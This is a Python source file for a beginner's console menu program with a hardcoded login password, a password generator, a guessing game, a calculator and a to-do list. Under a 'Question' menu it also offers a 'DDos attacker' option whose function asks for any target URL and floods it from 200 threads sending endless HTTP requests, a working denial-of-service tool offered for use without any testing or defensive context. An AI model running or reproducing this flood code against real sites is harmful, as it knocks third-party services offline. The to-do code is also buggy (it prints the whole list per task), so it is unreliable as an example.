import random
import requests
import threading


PASSWORD = "secret123"  
MAX_ATTEMPTS = 3


def login():
    attempts = 0
    while attempts < MAX_ATTEMPTS:
        password = input("Enter password to access the program: ")
        if password == PASSWORD:
            return True
        else:
            attempts += 1
            print(f"Wrong password! {MAX_ATTEMPTS - attempts} attempts remaining.")
    print("Maximum attempts reached. Access denied.")
    return False

def show_menu():
    menu = [
        "1. Question",
        "2. Password Generator",
        "3. Number game",
        "4. Calculator",
        "5. To-Do List ",
        "6. development",
        "7. Exit",
    ]
    print("\nMenu:")
    for item in menu:
        print(item)

def show_calculator_menu():
    menu = [
        "1. Addition",
        "2. Subtraction",
        "3. Multiplication",
        "4. Division",
        "5. Exponentiation",
        "6. Modulus",
        "7. Floor Division",
        "8. Exit"
    ]
    print("\nCalculator Menu:")
    for item in menu:
        print(item)

def to_do_list_menu():
    menu = [
        "\nOptions:",
        "1. Show Tasks",
        "2. Add Task",
        "3. Delete Task",
        "4. Exit"
    ]
    print("\nTo-Do List Menu.")
    for items in menu:
        print(items)

def question_module():
    while True:
        print("\nQuestion Menu:")
        print("1. For loop")
        print("2. DDos attacker")
        print("3. Exit Back")

        choice2 = int(input("Enter your choice: "))

        if choice2 == 1:
            print("This is a For Loop Program.")
            start = int(input("Enter a start number: "))
            stop = int(input("Enter a stop number: "))
            skip = int(input("Number you want to skip: "))

            if start >= stop:
                print("You entered numbers in the wrong format.")
            else:
                for i in range(start, stop):
                    if i == skip:
                        continue
                    elif stop <= skip:
                        print("The skip number is too large.")
                        break
                    else:
                        print(i)
        elif choice2 == 2:
            print("Entering in a DDos Machine")
            DDos_mmachine()

        elif choice2 == 3:
            print("Exiting Back...")
            break
        else:
            print("Error occurred. Please select a valid option.")


def password_generator():
    print("\nEntering in Password Generator")
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    num = int(input("Enter password length: "))

    if num > len(characters):
        print("Password length too long! Try a smaller number.")
        return

    password = "".join(random.sample(characters, num))
    print("Generated random password is:", password)


def number_game():
    print("\nThis is a Number Guessing Game")
    attempts = 0
    max_attempts = 10
    number = random.randint(1, 200)

    print("Guess a number between 1 and 200...")
    print("   You have only 10 attempts...")

    while attempts < max_attempts:
        try:
            user = int(input("# Enter a Number: "))
        except:
            print("Error, Enter only integers")
            return

        attempts += 1

        if user < number:
            print("Too low!")
        elif user > number:
            print("Too high!")
        else:
            print(f"🎉 Congratulations! You guessed the number {number} in {attempts} attempts.")
            break
    else:
        print(f"❌ Game over! The number was {number}.")


def calculator():
    def add(a, b): return a + b
    def subtract(a, b): return a - b
    def multiply(a, b): return a * b
    def divide(a, b):
        if b == 0:
            raise ValueError("Cannot divide by zero.")
        return a / b
    def exponentiate(a, b): return a ** b
    def modulus(a, b): return a % b
    def floor_divide(a, b): return a // b

    def calculator_menu():
        while True:
            show_calculator_menu()
            choice = input("Enter your choice (1-8): ")

            if choice == "8":
                print("Exiting the calculator. Goodbye!")
                break

            if choice in ["1", "2", "3", "4", "5", "6", "7"]:
                try:
                    a = float(input("Enter first number: "))
                    b = float(input("Enter second number: "))
                except:
                    print("Invalid input! Please enter numbers only.")
                    continue

                try:
                    if choice == "1":
                        result = add(a, b)
                    elif choice == "2":
                        result = subtract(a, b)
                    elif choice == "3":
                        result = multiply(a, b)
                    elif choice == "4":
                        result = divide(a, b)
                    elif choice == "5":
                        result = exponentiate(a, b)
                    elif choice == "6":
                        result = modulus(a, b)
                    elif choice == "7":
                        result = floor_divide(a, b)
                    print(f"Result: {result}")
                except Exception as e:
                    print("Error:", e)
            else:
                print("Invalid choice. Please try again.")

    calculator_menu()
def to_do_list():
    def show_tasks(tasks):
        if not tasks:
            print("No tasks in the list.")
        else:
            for index, task in enumerate(tasks):
                print(f"{index + 1}. {tasks}")
                
    def add_task(tasks):
        task = input("Enter task: ")
        tasks.append(task)
        print("Task added.")

    def delete_tasks(tasks):
        show_tasks(tasks)
        try:
            task_index = int(input("Enter the task number to delete: "))
            if 0 <= task_index < len(tasks):
                del tasks[task_index]
                print("Task deleted")
            else:
                print("Invalid task number.")
        except ValueError:
            print("Invalid input. Please enter a number.")
    def main_menu():
        tasks = []
        while True:
            to_do_list_menu()

            choice = input("Enter your choice: ")

            if choice == "1":
                show_tasks(tasks)
            elif choice == "2":
                add_task(tasks)
            elif choice == "3":
                delete_tasks(tasks)
            elif choice == "4":
                break
            else:
                print("Invalid choice")
    main_menu()

def DDos_mmachine():
    target = input("Enter the target URL (e.g., https://example.com): ")

    if not target.startswith("http://") and not target.startswith("https://"):
        target = "http://" + target

    def flood():
        count = 1
        while True:
            try:
                r = requests.get(target)
                print(f"[{threading.current_thread().name}] ✅ Status: {r.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"[{threading.current_thread().name}] ❌ Error: {e}")
                break

    threads = []
    for i in range(200):
        t = threading.Thread(target=flood, name=f"Thread-{i+1}")
        t.start()
        threads.append(t)

def main():

    if not login():
        return

    while True:
        show_menu()
        choice = input("Enter your choice: ")

        if choice == "1":
            question_module()
        elif choice == "2":
            password_generator()
        elif choice == "3":
            number_game()
        elif choice == "4":
            calculator()
        elif choice == "5":
            to_do_list()
        elif choice == "6":
            print("This program in under developemt")
            continue
        elif choice == "7":
            print("Exiting the program...")
            break
        else:
            print("Enter a valid choice.")

if __name__ == "__main__":
    main()